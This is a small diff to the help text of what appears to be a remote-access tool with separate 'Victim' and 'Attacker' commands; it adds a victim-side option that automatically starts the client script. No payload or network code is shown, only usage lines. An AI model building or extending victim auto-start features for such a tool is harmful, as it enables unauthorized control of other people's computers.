@@ -4,6 +4,7 @@ def help():
 
     Victim:
         python main.py -l
+        python main.py -r
 
     Attacker:
         python main.py -ol
@@ -15,6 +16,7 @@ def help():
 
     Victim Options:
         -l, --listen          Start the client and wait for connections
+        -r, --run             Automatic start client script  
 
     Attacker Options:
         -ol, --online-list    List online clients
